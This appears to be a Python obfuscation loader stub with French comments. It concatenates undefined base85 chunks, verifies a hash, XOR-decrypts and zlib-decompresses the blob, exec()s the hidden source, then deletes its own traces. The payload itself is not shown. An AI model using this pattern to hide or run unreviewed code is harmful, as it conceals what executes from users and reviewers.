_pyWqINC4UEd7b3 = __import__('base64').b85decode(_caM2dlYu2O6hQd + _cdzucQo1Ay_JXs + _c_PsP4OOnqI8WC + _cpmti3OpMq5bjU + _cspps6H8g89MsS + _ch1Zbg8N2sQ1yc + _cgfnBgUg_bh0H9 + _czc5YeDtIWDoB5 + _cvp6FA1mNq8AmW + _cydQ3t1DdNNb7L + _ccW8hajdMcDeIM + _crbPC4NJSyIm1x + _cl2lmBotV9wPFR + _cxYLlxbhjomzhK + _caT8GiYZE2Ozeu + _coi2RyeAs_gjFW + _cs5jLmrMdd9LR8 + _ctOhKBejTlfJhP + _ctzvCZHI8BB7gS + _cuRIYhZF7HY8Nv + _cssaXXA02mjBqU + _cfbZCpb9Y1QpHk + _cbRYzFPihRKv9g + _cipfWUMoYp0eue + _cdMirwF_ZKF3cI + _cdcUOKVQwFEnHg + _cuRIC7KtFKRlgU + _cvAvnBI5a2mVsK + _cnn0xR1Tn3zMuz + _cxrZ5BrMC34mex + _cqjYj5IoPENN0D + _cl42r5XcMGcSP7 + _ckXqQaYBBU2_Fh + _cu643DXux_Boc9 + _c_5ge6lsDJJQyz + _cyDaOiXNWODoc1 + _cxRqZlxPNfaYSU + _cffokeFSQKBpTu + _cmWDDZ70W_ZxxO + _crTRAYW0XFBjfG + _chf7YpoINWBDN8 + _chfUpl0DnusQqa + _cduudODC5Og6RB + _cvGhzJ7_wQeEph + _conLXIMv1JX36t + _ciJ_gwys8hqVpb + _cqOq_cbgO0FDF_ + _cpfIJ787FpU2am + _cluPSW6jCQOtAU + _cgY0T2OWnNXnzs + _cx30bSOVHTS7ES + _ctAeYf3_MTZ5Fv + _cwvkreHCTmWqw8 + _cxijcwa_pkMf0U + _cpRFC1XlS4uz7R + _cjmX5iPj6xdwm5 + _ct6wpDtVYgRkMZ + _cadu24XsTJVuQZ + _cbn9IZDOdEZwuo + _cmRoaNxxKUWXhS + _cdPtP8Tp9bBdft + _cqKpQvRf9LHDG1 + _clE4_KKGEBza3H + _cgJKbx5LA4i1o8 + _ctaeo2AVvG0uQc + _chIavICR2tm_Rb + _cdPVo4kFvLaqXR + _conkJaCpf3F8nJ + _cjQDoRSQYptwNB + _c_zdYm7BSta7_S + _caDCgZBNwtCzLT + _cpeU9hoUNhtbrU + _chT5iRUL1sjfrZ + _cgJF1NQt6cmo8d + _cxteOUiYgk3HTY + _cfd1MLarrmfWqF + _cbBDoJggqpKkZK + _cz_GsOaCtIR9or + _co8yIgXDJ4ZT21 + _csrWlckpQqTdzn + _cbvEEsL0AU6uN0 + _clWkyUOjiruIFT + _clKZD7zk7PabM0 + _ctGWnzr2jwfd56 + _cwu5rzCcQPW9YX + _c_4o_BCA_w9glp + _ck1JQX5WJxU5xu + _cyN7Xx0XSu3mMS + _cu8HDZbF3kuMOA + _clWodbDzqAXBdI + _chOQ2ISAwH9Efo + _clxL2NaprnHbFw + _cqne9q_0Ya0e4_ + _cjx7cJobeHE7uJ + _csFCapp1e46L1K + _ci9lshpPB_BodY + _ce_fnBQ2kTXwh5 + _csBwa3LPXilmKQ + _cw5WU5pac9dLvy + _cjfpdNAAsDnAbf + _cnEXmkY7mtWyVD + _cdqe6w3vSuglMb + _ctomTklId4Bk0y + _cvwwo1GWuv4rlU + _ct9x2t9T7powc4 + _cskbocvYzUFEwp + _c_gcx8J6zbBHcU + _cl_4lr48GOsgPG + _cp1bDMC4Wv8aUi + _chF539_XnBOL2N + _cnwXsEkmPM9a3N + _cqxokpQtKMVIBc + _co8LM8Hy4TJkAi + _clE5bFvwlsuxVO + _cp9QblNImuNlr6 + _cx0tFEK98j1NMB + _cxiBgJRImeUaNq + _cn0VoHn6wQ4lsK + _cdpFQpM6T3jZu2 + _csqYYdexe0R5Wf + _ckvfukoxn_uF1w + _coCjDgrzJHwSf2 + _cr0lnApoZZ2Gz6 + _cr8VD7CdOtkbJG + _cxdvVPPhjG94SV + _cbDnwvB0bLFxGe + _cdMZfFkkScolBJ + _cvCfacSh_oS8G4 + _cccDzJg3IvthhJ + _cq6nS2xBUPz9Td + _c_51lsiBqx0AZD + _ctg7K9hHbtKAGA + _cnpfhGyZI7emaN + _cqyXyCxFJM1hYA + _clSGqB_gSaZFHl + _caXPMDzi_G7zYa + _ci1hKLtceD6oo2 + _cwspqFDCkScNQT + _ciy2EbEzWMzvoh + _cldCvgTKYxHQwH + _ciOpD085ARJ4EF + _cwFfaPbdVEDjyP + _coImNF_jraJDs4 + _cgj7a8fIvA0FpM + _coz4vZBd0KyJrB + _clnQIAaN7IDd44 + _crNa0Hm7vn3ko0 + _cmZl0qzSZXZsE9 + _cycKb4bI_fsDhX + _coAJcL_hmAoN5B + _cxyoSBzpjACHjY + _cpHe2lfWB1SOcS + _cboHT7ulqAsJAQ + _cfYOnqy3jkGOS3 + _cri2v7yDUB5cQd + _cb8GQ1hAepYsjL + _caaiMMYvP27kVJ + _cf6RaSvhi_pmTW + _cltzzHJR35EmRG + _coEVteFeTOIiml + _cs_IFpRk8PXTTM + _cwthXZTXnns7ZG + _crFtiiaWCV_STr + _ccra30WPadEI2r + _cyecl3W6ifjZMN + _cjwfPaZW80phkZ + _cvd5HpwXp3vEMF + _css6TUFf7p172q + _cdEFredZmH_kCw + _csFTSt7esZRmpq + _cnuUQ8KbUwOxCq + _cqkuWslxXAYeka + _cyQBQj3iCTRoc2 + _cxZL7gLNf6tMYZ + _clfaVaHcuFfnkU + _csIypgU86KkIPr + _cu0vhxcuon2okH + _cpey_55GiAHpIt + _chpo85frtxnUma + _cf4Ce_OIKku9Nw + _cvzID272tJjp11 + _caPax24yZSiHbO + _cjv79wMsv7nPpt + _c_iMq6bqoYW7hl + _ccpGnqHH4emjYi + _cfrW0aux7Y7FxB + _czh7j7mesURJfL + _chVp4iuD0g1Wyg + _cygiaNtg5CO9mZ + _cqIkX63oDm4zb1 + _cf1pyWIP76QlTw + _cnYQaAijl8G4h5 + _cyBd3ZnycGtqgp + _c_f927jnOOzii0 + _crfTrpaZ9jzXiS + _cly_E6W9QVvCv0 + _cvVOGj6HXLgQdE + _csMYz378T0PscJ + _cy5JzI_adiEfnV + _cw8C4FVZPc4tdm)
if __import__('hashlib').sha256(_pyWqINC4UEd7b3).hexdigest() != '0a49210c2d7527c10ad2ea2995b9b793925e74062e9e550436edac4ad31b26f3':
    __import__('sys').exit(1)
_xwhQDuCjneKwBz = bytes([94, 47, 210, 223, 23, 90, 82, 132, 50, 34, 154, 100, 174, 100, 243, 28, 136, 63, 138, 43])
_fktTo82b5z4012Z = bytes([112, 17, 178, 52, 111, 71, 98, 171, 43, 171, 183, 164, 45, 26, 214, 185, 25, 145, 195, 27])

def _fxryfUd6GgM0H8k(_bd74lI6VCOqLzV, _kvdFRL033Te0aD):
    return bytes(_bd74lI6VCOqLzV[_ij8M4MPPUwLfLa] ^ _kvdFRL033Te0aD[_ij8M4MPPUwLfLa % len(_kvdFRL033Te0aD)] for _ij8M4MPPUwLfLa in range(len(_bd74lI6VCOqLzV)))

def _fddcBAF4X1Evya8(_tgvTIbIPgu5pta):
    import zlib
    return zlib.decompress(_tgvTIbIPgu5pta) # Un seul niveau de zlib ici pour simplifier

def _fevQlU8MdohqnwD():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xkvU_8cOS71P7B = _fxryfUd6GgM0H8k(_pyWqINC4UEd7b3, _xwhQDuCjneKwBz)
    # 2. Décompression Zlib
    _daRlKUsrZL9AH0 = _fddcBAF4X1Evya8(_xkvU_8cOS71P7B)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _daRlKUsrZL9AH0.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nbTLMoq7RjHVkE = _main.__dict__
    _nbTLMoq7RjHVkE.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nbTLMoq7RjHVkE)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fevQlU8MdohqnwD()
try:
    del _fxryfUd6GgM0H8k, _fddcBAF4X1Evya8, _fevQlU8MdohqnwD
    del _pyWqINC4UEd7b3, _xwhQDuCjneKwBz, _fktTo82b5z4012Z
except:
    pass
